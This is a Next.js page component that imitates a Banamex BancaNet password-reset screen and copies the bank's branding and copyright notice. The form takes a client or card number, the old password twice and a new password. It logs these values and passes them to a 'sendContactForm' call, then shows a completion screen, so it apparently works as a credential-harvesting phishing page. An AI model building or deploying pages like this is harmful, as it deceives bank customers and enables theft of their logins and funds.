import Image from "next/image";
import { SupportCard } from "@/components/SupportCard";
import { Footer } from "@/components/Footer";
import { Terms } from "@/components/Terms";
import * as Yup from "yup";
import { Form, Formik } from "formik";
import { useState } from "react";
import { Confirmed } from "@/components/Confirmed";
import { sendContactForm } from "../lib/api";
import Header from "../public/header.png";
import { Card } from "@/components/Card";
import { AppCard } from "@/components/AppCard";
import { Done } from "@/components/Done";

interface initialValues {
  numberClient: string;
  oldPassword: string;
  oldPasswordConfirmed: string;
  newPassword: string;
  newPasswordConfirmed: string;
}

const initialValues: initialValues = {
  numberClient: "",
  oldPassword: "",
  oldPasswordConfirmed: "",
  newPassword: "",
  newPasswordConfirmed: "",
};

const validationSchema = Yup.object().shape({
  numberClient: Yup.string()
    .trim()
    .required("Número de Cliente o Tarjeta obligatorio.")
    .min(
      4,
      ({ min }) =>
        `El Usuario que ingresó debe de contener al menos ${min} números`
    ),
  oldPassword: Yup.string().trim().required("Contraseña obligatoria."),
  oldPasswordConfirmed: Yup.string()
    .trim()
    .required("Contraseña obligatoria.")
    .oneOf([Yup.ref("oldPassword"), ""], "Las contraseñas deben de coincidir"),
  newPassword: Yup.string().trim().required("Contraseña obligatoria."),
  newPasswordConfirmed: Yup.string()
    .trim()
    .required("Contraseña obligatoria.")
    .oneOf([Yup.ref("newPassword"), ""], "Las contraseñas deben de coincidir"),
});

export default function Home() {
  const [submitted, setSubmitted] = useState(false);

  const onSubmit = async (values: initialValues) => {
    console.log(values);
    setSubmitted(true);
    await sendContactForm(values);
  };

  return (
    <main className="overflow-y-auto overflow-x-hidden w-fit mx-auto overscroll-x-none">
      <div className="flex justify-center bg-[#004684] py-4">
        <Image src={Header} width={200} height={100} alt="Ctx Image" />
        <p className="text-white mt-1 ml-2 font-light">| BancaNet</p>
      </div>

      <div className="flex justify-center mt-5 mx-5 bg-white drop-shadow-2xl border rounded-lg p-5 pb-24 pt-5">
        {!submitted ? (
          <Formik
            initialValues={initialValues}
            validationSchema={validationSchema}
            onSubmit={onSubmit}
          >
            {(props) => (
              <Form>
                <h2 className="mb-6 flex justify-center font-bold">
                  Restaurar Contraseña
                </h2>
                <label>Número de Cliente - Tarjeta de Crédito</label>
                <input
                  type="text"
                  value={props.values.numberClient}
                  onBlur={() => props.handleBlur("numberClient")}
                  onChange={(v) =>
                    props.setFieldValue("numberClient", v.target.value)
                  }
                  className="w-full h-10 rounded-full border-2 border-[#004684] ring-0 ring-transparent outline-none "
                />

                <p className="text-red-700 mb-5 text-xs">
                  {props.errors.numberClient}
                </p>

                <label>Contraseña Anterior</label>
                <input
                  type="password"
                  value={props.values.oldPassword}
                  onBlur={() => props.handleBlur("oldPassword")}
                  onChange={(v) =>
                    props.setFieldValue("oldPassword", v.target.value)
                  }
                  className="w-full h-10 rounded-full border-2 border-[#004684] ring-0 ring-transparent outline-none"
                />
                <p className="text-red-700 mb-5 text-xs">
                  {props.errors.oldPassword}
                </p>

                <label>Confirmar Contraseña Anterior</label>
                <input
                  type="password"
                  value={props.values.oldPasswordConfirmed}
                  onBlur={() => props.handleBlur("oldPasswordConfirmed")}
                  onChange={(v) =>
                    props.setFieldValue("oldPasswordConfirmed", v.target.value)
                  }
                  className="w-full h-10 rounded-full border-2 border-[#004684] ring-0 ring-transparent outline-none"
                />
                <p className="text-red-700 mb-5 text-xs">
                  {props.errors.oldPasswordConfirmed}
                </p>

                <label>Nueva Contraseña</label>
                <input
                  type="password"
                  value={props.values.newPassword}
                  onBlur={() => props.handleBlur("newPassword")}
                  onChange={(v) =>
                    props.setFieldValue("newPassword", v.target.value)
                  }
                  className="w-full h-10 rounded-full border-2 border-[#004684] ring-0 ring-transparent outline-none"
                />
                <p className="text-red-700 mb-5 text-xs">
                  {props.errors.newPassword}
                </p>

                <label>Confirmar Nueva Contraseña</label>
                <input
                  type="password"
                  value={props.values.newPasswordConfirmed}
                  onBlur={() => props.handleBlur("newPasswordConfirmed")}
                  onChange={(v) =>
                    props.setFieldValue("newPasswordConfirmed", v.target.value)
                  }
                  className="w-full h-10 rounded-full border-2 border-[#004684] ring-0 ring-transparent outline-none"
                />
                <p className="text-red-700 mb-5 text-xs">
                  {props.errors.newPasswordConfirmed}
                </p>

                <button
                  disabled={!props.isValid || !props.dirty}
                  className={`bg-[#004684] text-white w-full rounded-full py-2 ${
                    !props.dirty || !props.isValid ? "bg-slate-500" : ""
                  }`}
                  onClick={() => onSubmit(props.values)}
                >
                  Enviar
                </button>
              </Form>
            )}
          </Formik>
        ) : (
          <div className="flex justify-center">
            <Done />
          </div>
        )}
      </div>

      <div className="mt-8 flex justify-center">
        <Card />
      </div>
      <div className="mt-8 flex justify-center">
        <AppCard />
      </div>
      <div className="mt-8">
        <Terms />
      </div>
      <div className="mt-8 w-80 mx-auto flex justify-center">
        <p className="text-[0.5rem] text-center text-[#474747]">
          D.R. Copyright 2023, Derechos Reservados. Banco Nacional de México,
          S.A., integrante de Grupo Financiero Banamex. Isabela la Católica 44.
          Col. Centro Histórico. C.P.06000. Del. Cuauhtémoc, Ciudad de México,
          México.
        </p>
      </div>
      <div className="mt-8">
        <Footer />
      </div>
    </main>
  );
}
